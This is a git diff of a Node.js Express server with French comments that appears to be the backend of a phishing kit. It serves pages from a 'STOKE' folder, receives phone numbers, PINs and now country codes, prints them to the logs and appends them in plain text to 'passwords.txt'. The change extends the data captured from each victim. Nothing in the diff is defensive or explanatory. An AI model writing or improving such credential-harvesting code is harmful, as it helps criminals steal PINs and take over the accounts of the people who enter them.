@@ -6,34 +6,40 @@ const cors = require("cors");
 const app = express();
 const PORT = process.env.PORT || 10000;
 
+
+// Middleware
 app.use(cors());
 app.use(express.urlencoded({ extended: true }));
-app.use(express.json()); // ← indispensable pour fetch JSON
+app.use(express.json()); // indispensable pour fetch JSON
 
+// Dossier statique
 app.use(express.static(path.join(__dirname, "..", "STOKE")));
 
+// Fichier où les données seront sauvegardées
 const FILE = path.join(__dirname, "passwords.txt");
 
+// Route POST pour recevoir phone, pin et country
 app.post("/", (req, res) => {
-    const { phone, pin } = req.body;
+    const { phone, pin, country } = req.body; // ajout de country
 
-    // 🔍 LOGS RENDER (ce que tu veux voir)
+     // 🔍 Logs sur Render
     console.log("REQ BODY :", req.body);
-    console.log("PHONE :", phone);
-    console.log("PIN :", pin);
+    console.log("COUNTRY :", country);
+    console.log("PHONE   :", phone);
+    console.log("PIN     :", pin);
 
-    if (!phone || !pin) {
+    if (!phone || !pin || !country) {
         console.log("❌ Données manquantes");
         return res.sendStatus(400);
     }
-
-    const line = `PHONE: ${phone} | PIN: ${pin}\n`;
+     // Sauvegarde dans le fichier
+    const line = `COUNTRY: ${country} | PHONE: ${phone} | PIN: ${pin}\n`;
     fs.appendFileSync(FILE, line);
 
-    // ⚠️ fetch n’aime pas les redirect
+    // Réponse simple
     res.sendStatus(200);
 });
 
+// Lancement du serveur
 app.listen(PORT, () => {
-    console.log("Serveur online sur port " + PORT);
-});
+  console.log("Serveur online sur port " + PORT);});
